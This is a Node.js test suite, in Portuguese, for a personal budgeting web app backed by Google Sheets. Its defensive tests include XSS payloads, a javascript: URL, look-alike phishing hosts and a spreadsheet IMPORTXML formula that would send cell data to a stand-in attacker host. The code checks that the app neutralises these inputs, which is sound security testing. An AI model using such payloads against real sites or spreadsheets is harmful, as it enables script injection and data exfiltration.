'use strict';
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const RAIZ = path.join(__dirname, '..');

function criarPlanilha() {
  class Aba {
    constructor(nome) { this.nome = nome; this.cel = {}; }
    getName() { return this.nome; }
    getLastRow() { let m = 0; for (const k in this.cel) { const r = +k.split(',')[0]; if (this.cel[k] !== '' && r > m) m = r; } return m; }
    getRange(r, c, nr, nc) { return new Faixa(this, r, c, nr || 1, nc || 1); }
    setFrozenRows() {}
    setColumnWidth() {}
  }
  class Faixa {
    constructor(a, r, c, nr, nc) { Object.assign(this, { a, r, c, nr, nc }); }
    getValues() {
      const o = [];
      for (let i = 0; i < this.nr; i++) {
        const l = [];
        for (let j = 0; j < this.nc; j++) { const v = this.a.cel[`${this.r + i},${this.c + j}`]; l.push(v === undefined ? '' : v); }
        o.push(l);
      }
      return o;
    }
    getValue() { return this.getValues()[0][0]; }
    setValues(v) {
      v.forEach((l, i) => l.forEach((x, j) => {
        if (typeof x === 'string' && x.startsWith('=')) throw new Error(`fórmula gravada: ${x}`);
        this.a.cel[`${this.r + i},${this.c + j}`] = x;
      }));
      return this;
    }
    setValue(x) { return this.setValues([[x]]); }
    clearContent() { for (let i = 0; i < this.nr; i++) for (let j = 0; j < this.nc; j++) delete this.a.cel[`${this.r + i},${this.c + j}`]; return this; }
    setNumberFormats() { return this; }
    setFontWeight() { return this; }
    setBackground() { return this; }
    setFontColor() { return this; }
  }
  return {
    abas: [new Aba('Página1')],
    getSheetByName(n) { return this.abas.find((a) => a.nome === n) || null; },
    insertSheet(n) { const a = new Aba(n); this.abas.push(a); return a; },
    getSheets() { return this.abas; },
    deleteSheet(a) { this.abas = this.abas.filter((x) => x !== a); },
    getUrl() { return 'https://docs.google.com/spreadsheets/d/teste'; }
  };
}

function carregarServidor(planilha) {
  const ctx = vm.createContext({
    SpreadsheetApp: { getActiveSpreadsheet: () => planilha },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    Utilities: { formatDate: (d) => d.toISOString().slice(0, 19) },
    PropertiesService: {}, HtmlService: {},
    Session: { getEffectiveUser: () => ({ getEmail: () => 'pessoa@example.com' }) },
    console, Intl
  });
  vm.runInContext(fs.readFileSync(path.join(RAIZ, 'Code.gs'), 'utf8'), ctx);
  return ctx;
}

function carregarPagina() {
  const app = fs.readFileSync(path.join(RAIZ, 'fonte', 'app.js'), 'utf8');
  const logica = app.split('\n').slice(2).join('\n').replace(/let S = carregar\(\);[\s\S]*$/, '');
  const cripto = app.slice(app.indexOf('const CRIPTO_OK'), app.indexOf('let botaoSenha'));
  assert.ok(logica.includes('function resumo(') && cripto.includes('function decifrar('), 'trechos da página encontrados');
  const ctx = vm.createContext({ console, Intl, URL, crypto: globalThis.crypto, TextEncoder, TextDecoder, btoa, atob });
  vm.runInContext(`var window = this, localStorage; (function(){ ${logica}${cripto}
    this.pg = { estadoInicial, normalizar, resumo, avancarMes, fgtsMes, projetarFgts, fgtsPorAno, linkGoogle, temDados, resumoDados, cifrar, decifrar, CRIPTO_OK, esc }; }).call(this);`, ctx);
  return ctx.pg;
}

const pg = carregarPagina();

function exemplo() {
  return pg.normalizar({
    dados: 5, mesRef: '2027-01', salario: 4000, margem: 10,
    perfil: { nome: 'Ana Exemplo', criadoEm: '2026-12-01' },
    contas: [
      { id: 'c1', nome: 'Aluguel', categoria: 'casa', valor: 1200, parcelas: null },
      { id: 'c2', nome: 'Internet', categoria: 'casa', valor: 100, parcelas: null },
      { id: 'c3', nome: 'Streaming', categoria: 'assinaturas', valor: 40, parcelas: null },
      { id: 'c4', nome: 'Empréstimo', categoria: 'emprestimos', valor: 300, parcelas: 4 }
    ],
    cartao: { limite: 2000, itens: [
      { id: 'k1', nome: 'Fone', valor: 80, total: 3, parcelas: 2 },
      { id: 'k2', nome: 'Curso', valor: 120, total: 6, parcelas: 1 }
    ] },
    anuais: [
      { id: 'a1', nome: 'IPVA', valor: 1500, mes: 3, parcelas: 3, reservado: 0 },
      { id: 'a2', nome: 'Licenciamento', valor: 240, mes: 4, parcelas: 1, reservado: 0 }
    ],
    porquinhos: [
      { id: 'p1', nome: 'Viagem', meta: 3000, guardado: 600, ate: '2027-12', mensal: 0 },
      { id: 'p2', nome: 'Reserva', meta: 0, guardado: 0, ate: null, mensal: 150 }
    ],
    besteira: { teto: 300, gastos: [{ id: 'b1', data: '2027-01-05', desc: 'Café', cat: 'lanche', valor: 25, mes: '2027-01' }] },
    historico: [], quitadas: [],
    fgts: { ativo: true, saldo: 10000, bruto: 5000, aliquota: 8, tr: 0.15, decimo: true, ferias: 3 }
  });
}

test('quem começa do zero recebe um estado vazio, só com a data de início', () => {
  const v = pg.estadoInicial();
  assert.equal(v.salario, 0);
  assert.equal(v.contas.length + v.cartao.itens.length + v.porquinhos.length + v.anuais.length, 0);
  assert.equal(v.perfil.nome, '');
  assert.match(v.perfil.criadoEm, /^\d{4}-\d{2}-\d{2}$/);
  assert.equal(v.fgts.ativo, false);
});

test('FGTS: depósito de 8% do bruto e rendimento de 3% ao ano mais TR', () => {
  const m = pg.fgtsMes(exemplo(), '2027-01');
  assert.equal(m.mensal, 400);
  assert.equal(m.decimo, 0);
  assert.equal(m.ferias, 0);
  assert.ok(Math.abs(m.taxa - (1.0015 * Math.pow(1.03, 1 / 12) - 1)) < 1e-12);
  assert.equal(m.rendimento, 39.7);
  assert.equal(m.saldoFinal, 10439.7);
});

test('FGTS: 13º dividido entre novembro e dezembro e adicional de 1/3 no mês das férias', () => {
  const s = exemplo();
  assert.equal(pg.fgtsMes(s, '2027-11').decimo, 200);
  assert.equal(pg.fgtsMes(s, '2027-12').decimo, 200);
  assert.equal(pg.fgtsMes(s, '2027-03').ferias, 133.33);
  s.fgts.decimo = false;
  s.fgts.bruto = 0;
  const m = pg.fgtsMes(s, '2027-11');
  assert.equal(m.decimo, 0);
  assert.equal(m.mensal, 320);
});

test('FGTS: fechar o mês atualiza o saldo só de quem ativou', () => {
  assert.equal(pg.avancarMes(exemplo(), true).estado.fgts.saldo, 10439.7);
  const s = exemplo();
  s.fgts.ativo = false;
  assert.equal(pg.avancarMes(s, true).estado.fgts.saldo, 10000);
});

test('FGTS: a estimativa de 3 anos bate com fechar o mês 36 vezes', () => {
  let s = exemplo();
  const proj = pg.projetarFgts(s, 36);
  for (let i = 0; i < 36; i++) s = pg.avancarMes(s, true).estado;
  assert.equal(proj.length, 36);
  assert.equal(proj[35].saldoFinal, s.fgts.saldo);
  const anos = pg.fgtsPorAno(proj);
  assert.equal(anos.length, 3);
  assert.equal(anos[0].ate, '2027-12');
  assert.equal(anos[0].deposito, 5333.33);
  assert.equal(anos[2].saldo, s.fgts.saldo);
});

test('FGTS: valores fora da faixa voltam ao padrão', () => {
  const n = pg.normalizar({ salario: 1, contas: [], fgts: { ativo: 'sim', saldo: -5, aliquota: 999, tr: -1, ferias: 13 } });
  assert.equal(n.fgts.ativo, false);
  assert.equal(n.fgts.saldo, 0);
  assert.equal(n.fgts.aliquota, 8);
  assert.equal(n.fgts.tr, 0.15);
  assert.equal(n.fgts.ferias, null);
  assert.equal(n.fgts.decimo, true);
  assert.equal(pg.normalizar({ salario: 1, contas: [] }).fgts.ativo, false);
});

test('resumo do mês soma contas, cartão, reservas, porquinhos e margem', () => {
  const r = pg.resumo(exemplo());
  assert.equal(r.contas, 1640);
  assert.equal(r.cartao, 200);
  assert.equal(r.anuais, 60);
  assert.equal(r.porquinhos, 350);
  assert.equal(r.margem, 400);
  assert.equal(r.guardavel, 1400);
  assert.equal(r.livre, 1450);
  assert.equal(r.devo, 1480);
  assert.equal(r.gastoBesteira, 25);
  assert.equal(r.status, 'ok');
});

test('fechar o mês desconta parcelas, quita o que acabou e enche os porquinhos', () => {
  const { estado, eventos } = pg.avancarMes(exemplo(), true);
  assert.equal(estado.mesRef, '2027-02');
  assert.equal(estado.contas.find((c) => c.id === 'c4').parcelas, 3);
  assert.deepEqual(Array.from(estado.cartao.itens, (i) => i.id), ['k1']);
  assert.ok(eventos.some((e) => e.tipo === 'quitou' && e.nome === 'Curso'));
  assert.equal(estado.porquinhos[0].guardado, 800);
  assert.equal(estado.anuais[1].reservado, 60);
  assert.equal(estado.historico.length, 1);
  assert.deepEqual(Array.from(estado.quitadas, (q) => q.nome), ['Curso']);
});

test('nome do perfil perde espaços e caracteres de controle', () => {
  assert.equal(pg.normalizar({ salario: 1, contas: [], perfil: { nome: '  <b>Ana</b>\u0000 ' } }).perfil.nome, '<b>Ana</b>');
});

test('dados adulterados são limpos antes de chegar à tela', () => {
  const mal = {
    salario: 1e300, margem: 999, mesRef: '2026-12',
    contas: [null, 7, { id: '"><img src=x onerror=alert(1)>', nome: `A\u0000B${'x'.repeat(500)}`, categoria: 'constructor', valor: Infinity, parcelas: -3 }],
    cartao: { itens: [{ id: 'ok-1', nome: '<script>', valor: '12', parcelas: 9999 }] },
    anuais: [{ mes: 13, parcelas: 99 }], porquinhos: [{ ate: '2027-13', meta: 'x' }],
    besteira: { gastos: [{ data: '2026-12-01<svg onload=alert(1)>', mes: '<b>', cat: '__proto__', desc: 'oi' }] },
    historico: [{ mes: '2026-11', salario: '<img>' }, { mes: '<x>' }],
    quitadas: [{ nome: 'q', mes: '20<i>' }, { nome: 'q2', mes: '2026-10', onde: '<b>' }]
  };
  const n = pg.normalizar(JSON.parse(JSON.stringify(mal)));
  const c0 = n.contas[0];
  assert.equal(n.contas.length, 1);
  assert.match(c0.id, /^[A-Za-z0-9_-]+$/);
  assert.equal(c0.categoria, 'outros');
  assert.equal(c0.valor, 0);
  assert.equal(c0.parcelas, null);
  assert.equal(c0.nome.length, 120);
  assert.ok(!c0.nome.includes('\u0000'));
  assert.equal(n.salario, 0);
  assert.equal(n.margem, 50);
  assert.equal(n.cartao.itens[0].valor, 0);
  assert.equal(n.cartao.itens[0].parcelas, null);
  assert.equal(n.anuais[0].mes, null);
  assert.equal(n.anuais[0].parcelas, 1);
  assert.equal(n.porquinhos[0].ate, null);
  assert.equal(n.porquinhos[0].meta, 0);
  assert.equal(n.besteira.gastos[0].data, '');
  assert.equal(n.besteira.gastos[0].mes, '2026-12');
  assert.equal(n.besteira.gastos[0].cat, 'outros');
  assert.equal(n.historico.length, 1);
  assert.equal(n.historico[0].salario, 0);
  assert.equal(n.quitadas.length, 1);
  assert.equal(n.quitadas[0].onde, 'Conta');
  assert.doesNotMatch(JSON.stringify([c0.id, n.besteira.gastos[0].data, n.quitadas[0].mes]), /onerror|onload|<img|<svg|<script/);
});

test('onde salvar: só aceita o link de um app do Google Apps Script', () => {
  const id = 'AKfycbx1234567890abcdefghijklmnopqrstuvwxyz_-ABCDEFG';
  assert.equal(pg.linkGoogle(`https://script.google.com/macros/s/${id}/exec`), `https://script.google.com/macros/s/${id}/exec`);
  assert.equal(pg.linkGoogle(`  https://script.google.com/macros/s/${id}/exec?usp=sharing#x `), `https://script.google.com/macros/s/${id}/exec`);
  assert.equal(pg.linkGoogle(`https://script.google.com/macros/u/1/s/${id}/exec`), `https://script.google.com/macros/u/1/s/${id}/exec`);
  assert.equal(pg.linkGoogle(`https://script.google.com/a/macros/empresa.com.br/s/${id}/exec`), `https://script.google.com/a/macros/empresa.com.br/s/${id}/exec`);
  for (const ruim of [
    ['java', 'script:alert(1)'].join(''),
    `http://script.google.com/macros/s/${id}/exec`,
    `https://script.google.com.golpe.com/macros/s/${id}/exec`,
    `https://golpe.com/?https://script.google.com/macros/s/${id}/exec`,
    `https://usuario@script.google.com/macros/s/${id}/exec`,
    `https://script.google.com:8443/macros/s/${id}/exec`,
    `https://script.google.com/macros/s/${id}/dev`,
    'https://script.google.com/macros/s/curto/exec',
    `https://script.google.com/macros/s/${id}/exec/../../d/x/edit`,
    '', null
  ]) assert.equal(pg.linkGoogle(ruim), '', String(ruim));
});

test('onde salvar: resumo mostra o que existe antes de substituir', () => {
  assert.equal(pg.temDados(pg.estadoInicial()), false);
  assert.equal(pg.temDados(exemplo()), true);
  assert.equal(pg.resumoDados(exemplo()), 'salário de R$ 4.000,00, 4 contas, 2 compras no cartão, 2 porquinhos, mês de janeiro de 2027');
});

test('textos livres são escapados antes de ir para a tela', () => {
  assert.equal(pg.esc('<b>"x"&\''), '&lt;b&gt;&quot;x&quot;&amp;&#39;');
});

test('backup com senha: abre com a senha certa e recusa o resto', async () => {
  assert.ok(pg.CRIPTO_OK);
  const json = JSON.stringify(exemplo());
  const arq = await pg.cifrar(json, 'senha-forte-123');
  const o = JSON.parse(arq);
  assert.equal(o.formato, 'bolso-em-dia-cifrado');
  assert.equal(o.iter, 310000);
  assert.ok(!arq.includes('Aluguel') && !arq.includes('4000'));
  assert.equal(await pg.decifrar(o, 'senha-forte-123'), json);
  await assert.rejects(pg.decifrar(o, 'senha-errada'));
  await assert.rejects(pg.decifrar({ ...o, dados: `${o.dados.slice(0, -8)}AAAAAAAA` }, 'senha-forte-123'));
  await assert.rejects(pg.decifrar({ ...o, iter: 1e12 }, 'x'));
});

test('servidor: cria as abas, devolve os mesmos dados e detecta conflito', () => {
  const planilha = criarPlanilha();
  const srv = carregarServidor(planilha);
  const dados = exemplo();
  const inicio = srv.carregarDados();
  assert.equal(inicio.vazio, true);
  assert.equal(inicio.conta, 'pessoa@example.com');
  const s1 = srv.salvarDados(JSON.stringify(dados), 0);
  assert.equal(s1.ok, true);
  assert.equal(s1.versao, 1);
  assert.equal(planilha.getSheetByName('Página1'), null);
  assert.deepEqual(planilha.getSheets().map((a) => a.nome), ['Contas', 'Cartão', 'Anuais', 'Porquinhos', 'Besteiras', 'Meses', 'Quitadas', 'Config']);
  assert.equal(JSON.stringify(pg.normalizar(srv.carregarDados().estado)), JSON.stringify(pg.normalizar(dados)));
  assert.equal(srv.salvarDados(JSON.stringify(dados), 0).conflito, true);
});

test('servidor: texto que começa com = + - @ nunca vira fórmula', () => {
  const srv = carregarServidor(criarPlanilha());
  const dados = exemplo();
  srv.salvarDados(JSON.stringify(dados), 0);
  dados.contas[0].nome = '=IMPORTXML("http://atacante.example/?d="&B2,"//a")';
  dados.contas[1].nome = '+5';
  dados.contas[2].nome = '@x';
  dados.contas[3].nome = '-1';
  srv.salvarDados(JSON.stringify(dados), 1);
  const lido = srv.carregarDados().estado.contas;
  assert.deepEqual(Array.from(lido, (c) => c.nome), Array.from(dados.contas, (c) => c.nome));
});

test('servidor: recusa envio grande demais ou fora do formato', () => {
  const srv = carregarServidor(criarPlanilha());
  assert.throws(() => srv.salvarDados('x'.repeat(2000001), 0), /grandes demais/);
  assert.throws(() => srv.salvarDados('{"contas":"não é lista"}', 0), /inválido/);
});
